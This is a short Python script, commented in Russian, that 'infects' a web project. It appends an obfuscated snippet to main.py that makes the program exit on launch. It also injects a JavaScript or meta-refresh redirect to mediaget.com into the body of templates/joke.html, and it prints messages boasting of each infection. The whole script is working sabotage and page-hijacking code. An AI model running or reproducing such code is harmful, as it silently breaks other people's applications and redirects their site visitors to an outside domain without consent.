import os, random, re

# маскированная остановки
stops = [
    "a='5uIo_py'\nif a=='5uIo_py':import sys;sys.exit()\n",
    "b=chr(53)+chr(117)+chr(73)+chr(111)+chr(95)+chr(112)+chr(121)\nif b=='5uIo_py':import sys;sys.exit()\n",
]

# редирект
redirect_route = '@app.route("/1")\ndef r():from flask import redirect;return redirect("https://google.com")\n'

js_redirect = '<script>if(1)location.href="https://mediaget.com/"</script>'
meta_redirect = '<meta http-equiv="refresh" content="0;url=https://mediaget.com/">'


with open('main.py', 'a') as f:
    f.write('\n' + random.choice(stops))

print('[+] Заразил main.py остановкой')

# Вставка редиректа в HTML
with open('templates/joke.html','r') as f:
    c = f.read()

c = c.replace('<body>', '<body> ' + random.choice([js_redirect, meta_redirect]))
with open('templates/joke.html','w') as f:
    f.write(c)

print('[+] Заразил joke.html редиректом')
